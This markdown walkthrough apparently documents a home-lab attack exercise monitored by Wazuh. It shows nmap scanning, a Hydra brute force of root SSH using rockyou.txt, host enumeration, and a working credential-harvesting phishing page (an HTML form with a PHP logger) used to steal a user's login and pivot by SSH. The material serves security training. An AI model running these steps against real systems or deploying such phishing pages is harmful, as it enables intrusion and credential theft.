# recon and initial access Walkthrough

## 📌 Overview
This document outlines how an attacker gains access to the home lab environment.

---

## 🔍 Ensuring Security Monitoring
Before the attack, the **Security Server (`sec-box`)** ensures that the following VMs are monitored under Wazuh:
- **Windows Client (`win-client`)**
- **Linux Client (`linux-client`)**
- **Active Directory (`dc`)**

---

## 🚨 Attack Execution

### **1️⃣ Reconnaissance & Initial Access**
#### **Attacker Machine:**
The attacker starts by scanning the network to identify active hosts and services.

```bash
nmap -p1-1000 -sV -Pn 10.0.0.0/24
```
This reveals the **email server (`10.0.0.8`)**.

A focused scan is performed:
```bash
nmap -p1-1000 -sV -Pn 10.0.0.8
```
Findings:
- **SSH (22) Open**
- **SMTP (25) Open**

#### **Brute Forcing SSH**
Attempting to log in via SSH:
```bash
ssh root@10.0.0.8
```
A password prompt appears. The attacker uses **Hydra** to brute force SSH credentials using `rockyou.txt`.

```bash
hydra -l root -P /home/attacker/rockyou.txt ssh://10.0.0.8
```
After some time, the credentials are found:
- **Username:** root
- **Password:** november

The attacker successfully logs in:
```bash
ssh root@10.0.0.8
```

#### **Gathering System Information**
Once inside, the attacker gathers intelligence:
```bash
cat /etc/os-release      # Identify OS
hostname                # Get system name
ps aux                  # List running processes
ls -la /etc             # Explore configuration files
```

---

### **2️⃣ Expanding Access**

#### **Targeting the Domain Controller (`dc`)**
The attacker scans again:
```bash
nmap -p1-1000 -sV -Pn 10.0.0.0/24
```
Finds **corp.project-x-dc.com** (Active Directory) with:
- **Kerberos, NetBIOS, LDAP, Microsoft-DS ports open**

Instead of attacking AD directly, the attacker moves to an easier target: **Linux Client (`10.0.0.101`)** with open SSH and SMTP.

---

### **3️⃣ Phishing for Credentials**
The attacker finds an email from **janed@linux-client** in `/Maildir` on the email server.

They create a **phishing website**:
```bash
echo '<html><form method="POST" action="creds.php"><input name="user"><input name="pass" type="password"><input type="submit"></form></html>' > /var/www/html/index.html
echo '<?php file_put_contents("creds.log", $_POST["user"].":".$_POST["pass"]."\n", FILE_APPEND); ?>' > /var/www/html/creds.php
```
Start the **Apache web server**:
```bash
service apache2 start
```
The attacker crafts an email with a malicious link, impersonating the company, and sends it to **janed@linux-client**.

When Jane enters her credentials, the attacker retrieves them:
```bash
cat /var/www/html/creds.log
```
Finds login details and SSHs into `10.0.0.101`:
```bash
ssh janed@10.0.0.101
```


## ✅ Summary
- **Attacker gained initial access** via brute force on SSH.
- **Expanded access** by phishing `janed@linux-client`.
- **Compromised a second machine** using stolen credentials.

📌 **Lesson:** Strong passwords and awareness are crucial in detecting and preventing attacks!

---

This concludes the **reconnaisance and initial access**.

